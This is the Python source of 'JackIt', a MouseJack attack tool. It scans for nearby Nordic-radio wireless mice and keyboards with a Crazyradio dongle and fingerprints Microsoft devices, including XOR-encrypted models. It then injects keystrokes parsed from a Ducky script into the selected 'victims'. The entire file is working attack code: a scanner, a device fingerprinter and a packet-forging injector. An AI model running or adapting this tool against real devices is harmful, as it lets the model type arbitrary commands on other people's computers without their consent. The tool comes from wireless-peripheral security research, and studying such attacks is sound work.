#!/usr/bin/env python
# -*- coding: utf-8 -*-

import time
from lib import nrf24
import os
import click
import tabulate
import hidscript

__version__ = 0.01
__authors__ = "phikshun, infamy"

# some console colours
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

enable_debug = False

class DuckyParser:
    hid_map = {
        4: ['a', 'A'],
        5: ['b', 'B'],
        6: ['c', 'C'],
        7: ['d', 'D'],
        8: ['e', 'E'],
        9: ['f', 'F'],
        10: ['g', 'G'],
        11: ['h', 'H'],
        12: ['i', 'I'],
        13: ['j', 'J'],
        14: ['k', 'K'],
        15: ['l', 'L'],
        16: ['m', 'M'],
        17: ['n', 'N'],
        18: ['o', 'O'],
        19: ['p', 'P'],
        20: ['q', 'Q'],
        21: ['r', 'R'],
        22: ['s', 'S'],
        23: ['t', 'T'],
        24: ['u', 'U'],
        25: ['v', 'V'],
        26: ['w', 'W'],
        27: ['x', 'X'],
        28: ['y', 'Y'],
        29: ['z', 'Z'],
        30: ['1', '!'],
        31: ['2', '@'],
        32: ['3', '#'],
        33: ['4', '$'],
        34: ['5', '%'],
        35: ['6', '^'],
        36: ['7', '&'],
        37: ['8', '*'],
        38: ['9', '('],
        39: ['0', ')'],
        40: ['ENTER', 'ENTER'],
        41: ['ESC', 'ESC'],
        42: ['DELETE', 'DELETE'],
        43: ['TAB', 'TAB'],
        44: ['SPACE', 'SPACE'],
        45: ['-', '_'],
        46: ['=', '+'],
        47: ['[', '{'],
        48: [']', '}'],
        49: ['\\', '|'],
        51: [';', ':'],
        52: ['\'', '"'],
        53: ['`', '~'],
        55: ['.', '>'],
        56: ['/', '?'],
        57: ['CAPSLOCK', 'CAPSLOCK'],
        58: ['F1', 'F1'],
        59: ['F2', 'F2'],
        60: ['F3', 'F3'],
        61: ['F4', 'F4'],
        62: ['F5', 'F5'],
        63: ['F6', 'F6'],
        64: ['F7', 'F7'],
        65: ['F8', 'F8'],
        66: ['F9', 'F9'],
        67: ['F10', 'F10'],
        68: ['F11', 'F11'],
        69: ['F12', 'F12'],
        70: ['PRINTSCREEN', 'PRINTSCREEN'],
        71: ['SCROLLLOCK', 'SCROLLLOCK'],
        72: ['PAUSE', 'PAUSE'],
        73: ['INSERT', 'INSERT'],
        74: ['HOME', 'HOME'],
        75: ['PAGEUP', 'PAGEUP'],
        76: ['DEL', 'DEL'],
        77: ['END', 'END'],
        78: ['PAGEDOWN', 'PAGEDOWN'],
        79: ['RIGHT', 'RIGHT'],
        80: ['LEFT', 'LEFT'],
        81: ['DOWN', 'DOWN'],
        82: ['UP', 'UP'],
    }

    blank_entry = {
        "meta": False,
        "shift": False,
        "alt": False,
        "ctrl": False,
        "hid": 0,
        "char": '',
        "sleep": 0
    }
        
    def __init__(self, attack_script):
        self.script = attack_script.split("\n")

    def char_to_hid(self, char):
        for k, v in self.hid_map.iteritems():
            if v[0] == char:
                return k, False
            elif v[1] == char:
                return k, True

    def parse(self):
        entries = []
        for line in self.script:
            if line.startswith('ALT'):
                entry = self.blank_entry.copy()
                entry['alt'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("GUI") or line.startswith('WINDOWS') or line.startswith('COMMAND'):
                entry = self.blank_entry.copy()
                entry['meta'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('CTRL') or line.startswith('CONTROL'):
                entry = self.blank_entry.copy()
                entry['ctrl'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith('SHIFT'):
                entry = self.blank_entry.copy()
                entry['shift'] = True
                entry['char'] = line.split()[1]
                entry['hid'], entry['shift'] = self.char_to_hid(entry['char'])
                entries.append(entry)

            elif line.startswith("ESC") or line.startswith('APP') or line.startswith('ESCAPE'):
                entry = self.blank_entry.copy()
                entry['char'] = "ESC"
                entry['hid'], entry['shift'] = self.char_to_hid('ESC')
                entries.append(entry)

            elif line.startswith("DELAY"):
                entry = self.blank_entry.copy()
                entry['sleep'] = line.split()[1]
                entries.append(entry)

            elif line.startswith("STRING"):
                for char in " ".join(line.split()[1:]):
                    entry = self.blank_entry.copy()
                    entry['char'] = char
                    entry['hid'], entry['shift'] = self.char_to_hid(char)
                    entries.append(entry)

            elif line.startswith("ENTER"):
                entry = self.blank_entry.copy()
                entry['char'] = "\n"
                entry['hid'], entry['shift'] = self.char_to_hid('ENTER')
                entries.append(entry)
            elif len(line) == 0:
                pass
            else:
                print "CAN'T PROCESS... %s" % line
        
        return entries


class NordicScanner:

    def __init__(self, radio, ack_timeout=5, retries=1, debug=False):
        self.radio = radio
        self.channels = range(2, 84)
        self.channel_index = 0
        self.debug = debug
        self.devices = {}
        self.ack_timeout = max(0, min(ack_timeout, 15))
        self.retries = max(0, min(retries, 15))
        self.ping_payload = '0F:0F:0F:0F'.replace(':', '').decode('hex')

    def _debug(self, text):
        if self.debug:
            print  P + "[D] " + W + text

    def hexify(self, data):
        return ':'.join('{:02X}'.format(x) for x in data)

    def scan(self, timeout=5.0):
        # Put the radio in promiscuous mode
        self.radio.enter_promiscuous_mode('')
        dwell_time = 0.1

        # Set the initial channel
        self.radio.set_channel(self.channels[self.channel_index])

        # Sweep through the self.channels and decode ESB packets in pseudo-promiscuous mode
        last_tune = time.time()
        total_time = time.time()

        try:
            while time.time() - total_time < timeout:

                if len(self.channels) > 1 and time.time() - last_tune > dwell_time:
                    self.channel_index = (self.channel_index + 1) % (len(self.channels))
                    self.radio.set_channel(self.channels[self.channel_index])
                    last_tune = time.time()

                value = self.radio.receive_payload()
                if len(value) >= 5:
                    address, payload = value[0:5], value[5:]
                    a = self.hexify(address)
                    self._debug("ch: %02d addr: %s packet: %s" % (self.channels[self.channel_index], a, self.hexify(payload)))

                    if a in self.devices:
                        self.devices[a]['count'] += 1
                        self.devices[a]['timestamp'] = time.time()
                        if not self.channels[self.channel_index] in self.devices[a]['channels']:
                            self.devices[a]['channels'].append(self.channels[self.channel_index])
                        # Updates the payload to the longest -- ignores packets len 20 or higher (AES keyboard)
                        if len(payload) > len(self.devices[a]['payload']) and len(payload) < 20:
                            self.devices[a]['payload'] = payload
                    else:
                            self.devices[a] = { 'address': address, 'channels': [self.channels[self.channel_index]], 'count': 1, 'payload': payload }
                            self.devices[a]['timestamp'] = time.time()
        except RuntimeError:
            exit(-1)
        return self.devices

    def sniff(self, address):
        self.radio.enter_sniffer_mode(''.join(chr(b) for b in address[::-1]))


class NordicGenericHID:

    def __init__(self, radio, address, payload):
        self.radio = radio
        self.address = address
        self.string_address = self.hexify(address)
        self.raw_address = self.unhexify_addr(self.string_address)
        self.payload = payload[:]
        self.ack_timeout = 4
        self.retries = 15
        self.device_type = 'Generic'
        self.configure()

    def configure(self):
        raise NotImplementedError('Not implemented in generic HID')

    def hexify(self, val):
        return ':'.join('{:02X}'.format(b) for b in val)

    def unhexify_addr(self, val):
        return self.unhexify(val)[::-1][:5]

    def unhexify(self, val):
        return val.replace(':', '').decode('hex')

    def xor_crypt(self, pay):
        p = pay[:]
        for i in range(4, len(p)):
            p[i] ^= ord(self.raw_address[(i - 4) % 5])
        return p

    def serialize_payload(self, p):
        return str(bytearray(p))

    def checksum(self):
        self.payload[-1] = 0
        for i in range(0, len(self.payload) - 1):
            self.payload[-1] ^= self.payload[i]
        self.payload[-1] = ~self.payload[-1] & 0xff

    def inc_sequence(self):
        if self.payload[4] == 255:
            self.payload[5] += 1
            self.payload[4] = 0
        else:
            self.payload[4] += 1

    def set_key(self, key):
        raise NotImplementedError('Not implemented in generic HID')

    def clear_payload(self):
        raise NotImplementedError('Not implemented in generic HID')

    def post_keystroke_delay(self):
        pass

    def send_key(self, c=None):
        if not c:
            self.clear_payload()
            self.transmit()
        else:
            self.set_key(c)
            self.transmit()

    def transmit(self):
        self.inc_sequence()
        self.checksum()
        print repr(self.payload)
        self.radio.transmit_payload(self.serialize_payload(self.payload), self.ack_timeout, self.retries)
        self.post_keystroke_delay()

    def send_attack(self, attack):
        for _ in range(5):
            self.send_key()

        for c in attack:
            if c['hid']:
                self.send_key(c)
                self.send_key()
            elif c['sleep']:
                time.sleep(int(c['sleep']) / 1000)
        
        self.send_key()


class MicrosoftMouseDefaultHID(NordicGenericHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse'
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()

    def clear_payload(self):
        self.payload[7:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        self.payload[7] = 0
        self.payload[9] = key['hid']
        if key['meta']:
            self.payload[7] |= 0x08
        if key['shift']:
            self.payload[7] |= 0x02

class MicrosoftMouseEncryptHID(MicrosoftMouseDefaultHID):
    def configure(self):
        self.device_type = 'Microsoft Mouse XOR-Encrypted'
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()

    def serialize_payload(self, p):
        # re-encrypt before transmission
        return str(bytearray(self.xor_crypt(p)))

    def post_keystroke_delay(self):
        # testing found that encrypted keyboards require a short inter-key delay
        time.sleep(0.005)


class MicrosoftKeyboardEncryptHID(MicrosoftMouseEncryptHID):
    def configure(self):
        self.device_type = 'Microsoft Keyboard XOR-Encrypted'
        self.payload = self.xor_crypt(self.payload)
        self.payload = self.payload.tolist()
        self.payload[4:6] = [0, 0]
        self.payload[6] = 67
        self.clear_payload()
    
    def clear_payload(self):
        self.payload[7:15] = [0, 0, 0, 0, 0, 0, 0, 0]

    def set_key(self, key):
        self.payload[7] = 0
        self.payload[9] = key['hid']
        if key['meta']:
            self.payload[7] |= 0x08
        if key['shift']:
            self.payload[7] |= 0x20


def fingerprint_device(r, a, p):
    if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
        # Most likely a non-XOR encrypted Microsoft mouse
        return MicrosoftMouseDefaultHID(r, a, p)
    elif len(p) == 19 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft mouse
        return MicrosoftMouseEncryptHID(r, a, p)
    elif len(p) == 16 and p[0] == 0x0a:
        # Most likely an XOR encrypted Microsoft keyboard
        return MicrosoftKeyboardEncryptHID(r, a, p)
    else:
        return False


def _debug(debug, text):
    if debug:
        print  P + "[D] " + W + text

@click.command()
@click.option('--debug', is_flag=True, help='Enable debug.')
@click.option('--script', default="", help="Ducky file to use for injection", type=click.Path())
@click.option('--lowpower', is_flag=True, help="Disable LNA on CrazyPA")
@click.option('--interval', default=5, help="Interval of scan in seconds, default to 5s")
def cli(debug, script, lowpower, interval):

    print """
     ____.              __   .___  __   
    |    |____    ____ |  | _|   |/  |_ 
    |    \__  \ _/ ___\|  |/ /   \   __\\
/\__|    |/ __ \\\\  \___|    <|   ||  |  
\________(____  /\___  >__|_ \___||__|  
              \/     \/     \/          """

    print "JackIt Version %0.2f" % __version__
    print "Created by %s" % __authors__
    print ""

    if debug:
        print O + "[W] " + W + "Debug is enabled"

    if script == "":
        print R + '[!] ' + W + "You must supply a ducky script using --script <filename>"
        exit(-1)
    else:
        f = open(script,'r')
        parser = DuckyParser(f.read())
        attack = parser.parse()
    
    print repr(attack)

    #make sure we are root
    if os.getuid() != 0:
        print R + "[!] " + W + "You need to run as root!"
        exit(-1)

    # Initialize the radio
    try:
        radio = nrf24.nrf24(0)
    except Exception as e:
        if e.__str__() == "Cannot find USB dongle.":
            print R + "[!] " + W + "Cannot find Crazy PA USB dongle."
            print R + "[!] " + W + "Please make sure you have it preloaded with the mousejack firmware."
            exit(-1)

    # Assume Crazyradio PA
    if lowpower:
        print G + "[+] " + W + "Low power mode enabled"
    else:
        radio.enable_lna()

    # Create scanner instance
    scan = NordicScanner(radio=radio, debug=debug)

    print G + "[+] " + W + 'Scanning...'

    # Enter main loop
    try:
        try:
            while True:
                devices = scan.scan(interval)

                click.clear()
                print GR + "[+] " + W + ("Scanning every %ds " % interval) + G + "CTRL-C " + W + "when ready."
                print ""
                
                idx = 0
                pretty_devices = []
                for key, device in devices.iteritems():
                    idx = idx + 1
                    pretty_devices.append([
                        idx,
                        key,
                        ",".join(str(x) for x in device['channels']),
                        device['count'],
                        str(int(time.time() - device['timestamp'])) + 's ago',
                        scan.hexify(device['payload'])
                    ])


                print tabulate.tabulate(pretty_devices, headers=["KEY","ADDRESS","CHANNELS","COUNT","SEEN","PACKET"])
        except KeyboardInterrupt:
            print ""

        if 'devices' not in locals() or len(devices) == 0:
            print R + "[!] " + W + "No devices found please try again..."
            exit(-1)
        
        print GR + "\n[+] " + W + "Select " + G + "target keys" + W + " (" + G + "1-%s)" % (str(len(devices)) + W) + \
                    " separated by commas, or '%s': " % (G + 'all' + W),
        value = click.prompt('', default="all")
        value = value.strip().lower()

        if value == "all":
            victims = pretty_devices[:]
        else:
            victims = []
            for vic in value.split(","):
                if int(vic) <= len(pretty_devices):
                    victims.append(pretty_devices[(int(vic)-1)])
                else:
                    print R + "[!] " + W + ("Device %d key is out of range" % int(vic))

        targets = []
        for victim in victims:
            if victim[1] in devices:
                targets.append(devices[victim[1]])

        for target in targets:
            payload = target['payload']
            channels = target['channels']
            address = target['address']

            scan.sniff(address)
            device = fingerprint_device(radio, address, payload)
            
            if device:
                for channel in channels:
                    radio.set_channel(channel)
                    print GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (scan.hexify(address), device.device_type, channel)
                    device.send_attack(attack)
            else:
                print R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (scan.hexify(address))
                continue

        print GR + '\n[+] ' + W + "All attacks completed\n"

    except KeyboardInterrupt:
        print '\n ' + R + '(^C)' + O + ' interrupted\n'
        print "[-] Quitting"

if __name__ == '__main__':
    cli()
